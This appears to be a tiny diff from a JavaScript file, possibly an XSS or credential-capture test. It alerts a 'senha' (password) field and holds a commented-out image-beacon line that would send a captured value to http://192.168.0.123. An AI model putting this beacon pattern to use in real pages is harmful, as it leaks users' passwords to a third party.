@@ -8,4 +8,6 @@ var array = {
 alert(array.senha);
 
 
+
+
 // new Image().src = "http://192.168.0.123/?=" + retorno
